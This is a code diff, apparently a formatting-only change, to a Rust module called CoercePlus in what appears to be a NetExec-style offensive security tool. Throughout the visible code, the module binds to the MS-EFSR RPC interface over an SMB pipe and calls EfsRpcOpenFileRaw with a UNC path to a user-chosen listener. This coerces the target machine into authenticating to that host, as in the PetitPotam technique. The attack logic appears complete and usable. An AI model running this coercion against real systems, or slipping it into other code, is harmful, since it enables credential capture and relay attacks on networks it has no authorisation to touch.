@@ -5,8 +5,8 @@
 
 use anyhow::Result;
 use async_trait::async_trait;
-use tracing::{debug, error, info};
 use nxc_protocols::NxcSession;
+use tracing::{debug, error, info};
 
 use crate::{ModuleOption, ModuleOptions, ModuleResult, NxcModule};
 
@@ -72,17 +72,26 @@ impl NxcModule for CoercePlus {
             None => return Err(anyhow::anyhow!("LISTENER option is required")),
         };
 
-        let pipe = opts.get("PIPE").unwrap_or(&"lsarpc".to_string()).to_string();
-        info!("Attempting to coerce authentication from {} to listener {}", smb_session.target, listener);
+        let pipe = opts
+            .get("PIPE")
+            .unwrap_or(&"lsarpc".to_string())
+            .to_string();
+        info!(
+            "Attempting to coerce authentication from {} to listener {}",
+            smb_session.target, listener
+        );
 
         let smb = nxc_protocols::smb::SmbProtocol::new();
-        
-        use nxc_protocols::rpc::{DcerpcBind, DcerpcRequest, PacketType, UUID_EFSR, efsr};
-        
+
+        use nxc_protocols::rpc::{efsr, DcerpcBind, DcerpcRequest, PacketType, UUID_EFSR};
+
         // Bind to MS-EFSR
         let bind = DcerpcBind::new(UUID_EFSR, 1, 0); // MS-EFSR v1.0
-        
-        let _bind_resp = match smb.call_rpc(smb_session, &pipe, PacketType::Bind, 1, bind.to_bytes()).await {
+
+        let _bind_resp = match smb
+            .call_rpc(smb_session, &pipe, PacketType::Bind, 1, bind.to_bytes())
+            .await
+        {
             Ok(resp) => resp,
             Err(e) => {
                 error!("Failed to bind to {} over pipe '{}': {}", listener, pipe, e);
@@ -96,11 +105,23 @@ impl NxcModule for CoercePlus {
         let target_path = format!("\\\\{}\\share\\file.txt\x00", listener);
         let req_payload = efsr::build_efsrpc_open_file_raw(&target_path);
         let dce_req = DcerpcRequest::new(efsr::EFSRPC_OPEN_FILE_RAW, req_payload);
-        
-        let _trigger_resp = match smb.call_rpc(smb_session, &pipe, PacketType::Request, 2, dce_req.to_bytes()).await {
+
+        let _trigger_resp = match smb
+            .call_rpc(
+                smb_session,
+                &pipe,
+                PacketType::Request,
+                2,
+                dce_req.to_bytes(),
+            )
+            .await
+        {
             Ok(resp) => resp,
             Err(e) => {
-                error!("Failed to trigger EfsRpcOpenFileRaw check your listener! ({})", e);
+                error!(
+                    "Failed to trigger EfsRpcOpenFileRaw check your listener! ({})",
+                    e
+                );
                 // We still return true if we triggered because often the pipe closes upon coerce
                 Vec::new()
             }
@@ -108,7 +129,10 @@ impl NxcModule for CoercePlus {
 
         Ok(ModuleResult {
             success: true,
-            output: format!("Coercion payload sent to {} using EFSR on pipe {}. Check your listener at {}!", smb_session.target, pipe, listener),
+            output: format!(
+                "Coercion payload sent to {} using EFSR on pipe {}. Check your listener at {}!",
+                smb_session.target, pipe, listener
+            ),
             data: serde_json::json!({ "listener": listener, "pipe": pipe, "method": "EfsRpcOpenFileRaw" }),
             credentials: vec![],
         })
